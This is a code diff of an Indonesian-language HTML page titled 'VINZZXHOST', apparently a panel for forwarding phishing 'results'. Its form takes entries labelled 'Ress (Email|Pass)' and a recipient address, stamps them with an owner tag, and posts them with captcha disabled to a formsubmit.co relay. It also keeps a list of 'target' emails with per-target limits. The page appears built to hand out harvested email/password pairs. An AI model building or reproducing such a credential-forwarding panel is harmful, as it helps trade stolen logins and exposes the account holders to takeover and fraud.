@@ -2,12 +2,11 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VINZZXHOST - PANEL FIXED</title>
+    <title>VINZZXHOST - FIXED</title>
     <style>
         body { background-color: #000000; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; }
         .container { width: 100%; max-width: 380px; }
         
-        /* HEADER ASLI */
         .header { text-align: center; margin-bottom: 25px; }
         .logo-circle { 
             width: 100px; height: 100px; border-radius: 50%; border: 3px solid #00ff44; 
@@ -17,14 +16,12 @@
         .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
         .brand { font-size: 22px; font-weight: bold; letter-spacing: 2px; color: white; }
 
-        /* BUTTON SEWA PANEL */
         .btn-outline {
             display: block; width: 100%; padding: 12px; border: 1px solid #00ff44; border-radius: 25px;
             background: transparent; color: #00ff44; text-decoration: none; font-weight: bold;
-            margin-bottom: 25px; text-align: center; box-sizing: border-box;
+            margin-bottom: 25px; text-align: center; box-sizing: border-box; font-size: 13px;
         }
 
-        /* CARD STYLE AWAL */
         .card { background: #0a0a0a; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #1a1a1a; }
         .title-section { color: white; font-size: 16px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
         .title-section::before { content: ""; display: inline-block; width: 4px; height: 18px; background: #00ff44; margin-right: 10px; }
@@ -34,7 +31,6 @@
             color: #00ff44; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none; 
         }
 
-        /* BUTTON GRADIENT ASLI */
         .btn-grad { 
             width: 100%; padding: 12px; border: none; border-radius: 8px; 
             background: linear-gradient(45deg, #00b09b, #96c93d); color: black; font-weight: bold; cursor: pointer;
@@ -46,12 +42,10 @@
             display: block; text-align: center; box-sizing: border-box; margin-top: 10px;
         }
 
-        /* TABLE */
         .table-email { width: 100%; border-collapse: collapse; margin-top: 10px; }
         .table-email td { padding: 12px 5px; border-top: 1px solid #1a1a1a; font-size: 13px; }
         .limit-badge { background: #1a1a1a; color: #00ff44; padding: 2px 8px; border-radius: 4px; border: 1px solid #333; }
 
-        /* NOTIF POPUP */
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: 0.4s; z-index: 999; }
         .modal-overlay.show { opacity: 1; visibility: visible; }
         .modal-content { background: white; color: black; padding: 25px; border-radius: 20px; text-align: center; width: 250px; }
@@ -79,9 +73,14 @@
 
     <div class="card">
         <div class="title-section">DATA PANEL</div>
-        <form action="https://formsubmit.co/GANTI_GMAIL_ABANG@gmail.com" method="POST" id="formRess" onsubmit="prosesKirim()">
+        <form action="https://formsubmit.co/GANTI_GMAIL_PANGKALAN@gmail.com" method="POST" id="formRess" onsubmit="kurangiLimit()">
+            
+            <input type="text" name="Owner_Name" value="Result Own Vinzz 👽">
+            
             <input type="email" name="Kirim_Ke" placeholder="Email Tujuan Ress..." required>
+            
             <input type="text" name="Isi_Ress" placeholder="Input Ress (Email|Pass)..." required>
+            
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://vinzz638.github.io/panel-vinzzx/#success">
             <button type="submit" class="btn-grad">UPDATE DATA</button>
@@ -102,32 +101,26 @@
 </div>
 
 <script>
-    // Cek status sukses dari URL
     if(window.location.hash === "#success") {
         document.getElementById("notifBerhasil").classList.add("show");
         window.location.hash = ""; 
     }
 
-    function prosesKirim() {
-        kurangiLimit();
-        // Form akan submit otomatis lewat action form
-    }
-
     function tutupNotif() { document.getElementById("notifBerhasil").classList.remove("show"); }
 
     function simpanKeHP() {
-        localStorage.setItem('vinzz_final_fix', document.getElementById('listEmail').innerHTML);
+        localStorage.setItem('vinzz_final_fix_v2', document.getElementById('listEmail').innerHTML);
     }
 
     window.onload = function() {
-        const data = localStorage.getItem('vinzz_final_fix');
+        const data = localStorage.getItem('vinzz_final_fix_v2');
         if (data) { document.getElementById('listEmail').innerHTML = data; }
     };
 
     function tambahEmail() {
         const email = document.getElementById("inputEmail").value;
         const limit = document.getElementById("inputLimit").value || "0";
-        if (!email) return alert("Isi email dulu bang!");
+        if (!email) return alert("Isi email target!");
         
         const table = document.getElementById("listEmail");
         const row = table.insertRow(0);
